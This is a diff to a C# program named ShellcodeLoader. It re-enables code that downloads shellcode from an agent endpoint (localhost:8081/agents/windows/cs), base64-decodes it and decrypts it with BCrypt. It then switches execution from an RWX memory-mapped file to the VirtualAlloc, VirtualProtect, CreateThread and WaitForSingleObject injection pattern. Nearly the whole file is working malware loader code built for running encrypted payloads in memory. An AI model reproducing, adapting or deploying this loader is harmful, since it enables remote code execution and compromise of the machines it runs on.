@@ -9,7 +9,7 @@ namespace ShellcodeLoader
 {
     public class Loader
     {
-/*        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
@@ -29,16 +29,16 @@ namespace ShellcodeLoader
         public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
         [DllImport("kernel32.dll")]
-        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);*/
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
         [DllImport("Kernel32.dll")]
         public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate void MyFunction();
-/*
+
         [DllImport("kernel32.dll")]
-        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);*/
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
         [DllImport("bcrypt.dll")]
         public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);
@@ -102,7 +102,7 @@ namespace ShellcodeLoader
                 // Download the shellcode
                 shellcode = client.DownloadData("http://localhost:8081/agents/windows/cs");
             }
-/*
+
             // Base64 decoding
             shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
 
@@ -134,7 +134,7 @@ namespace ShellcodeLoader
             if (ntStatus != 0)
                 throw new Exception("BCryptDecrypt failed with status " + ntStatus);
 
-            shellcode = decryptedShellcode;*/
+            shellcode = decryptedShellcode;
 
             return shellcode;
         }
@@ -144,49 +144,21 @@ namespace ShellcodeLoader
 
             byte[] shellcode = getterShellcode();
 
-            /*var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
+            var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
 
             // Copy the shellcode into the memory region
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
             // For VirtualProtect
-            MemoryProtection oldProtect;
-            VirtualProtect(baseAddress, (uint)shellcode.Length, MemoryProtection.ExecuteRead, out oldProtect);
+            uint oldProtect;
+            VirtualProtect(baseAddress, (uint)shellcode.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);
 
             // For CreateThread
             IntPtr threadId;
             var hThread = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadId);
 
-
             // Wait infinitely on this thread to stop the process exiting
-            WaitForSingleObject(hThread, 0xFFFFFFFF);*/
-
-            using (var mmf = MemoryMappedFile.CreateNew(null, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute))
-            {
-                using (var accessor = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute))
-                {
-                    IntPtr pointer = accessor.SafeMemoryMappedViewHandle.DangerousGetHandle();
-                    Marshal.Copy(shellcode, 0, pointer, shellcode.Length);
-                }
-
-                using (var accessor = mmf.CreateViewAccessor(0, 0, MemoryMappedFileAccess.ReadWriteExecute))
-                {
-                    IntPtr pointer = accessor.SafeMemoryMappedViewHandle.DangerousGetHandle();
-                    uint oldProtect;
-
-                    if (!VirtualProtect(pointer, (uint)shellcode.Length, 0x40, out oldProtect)) //PAGE_EXECUTE_READWRITE
-                    {
-                        Console.WriteLine("[!] VirtualProtect Failed");
-                        return;
-                    }
-
-                    var functionDelegate = (MyFunction)Marshal.GetDelegateForFunctionPointer(pointer, typeof(MyFunction));
-                    Thread functionThread = new Thread(() => functionDelegate()) { IsBackground = true };
-                    functionThread.Start();
-                    functionThread.Join();
-                }
-            }
-
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
 }
